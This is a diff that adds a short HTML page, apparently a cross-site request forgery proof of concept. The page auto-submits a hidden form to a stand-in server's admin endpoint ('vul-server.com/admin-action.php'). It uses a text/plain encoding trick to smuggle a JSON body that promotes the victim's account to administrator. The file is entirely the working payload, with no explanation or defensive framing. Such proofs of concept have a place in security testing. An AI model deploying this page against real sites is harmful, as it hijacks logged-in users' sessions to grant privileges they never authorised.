@@ -1,0 +1,10 @@
+<html>
+  <body>
+    <form method="POST" action="https://vul-server.com/admin-action.php" enctype="text/plain">
+      <input type="hidden" name='{"promote": "set-admin", "dummykey' value='": "dummyvalue"}' />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
